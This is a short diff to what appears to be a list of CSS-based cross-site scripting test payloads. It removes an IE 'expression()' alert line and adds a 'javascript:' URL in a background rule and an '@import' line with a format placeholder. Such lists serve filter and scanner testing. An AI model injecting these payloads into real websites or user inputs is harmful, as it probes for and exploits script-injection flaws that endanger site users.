@@ -1,1 +1,2 @@
-{}*{xss:expression(open(alert(1)))}
+BODY{background:url("javascript:javascript:alert(1)")}
+*[{}@import'%(css)s?]
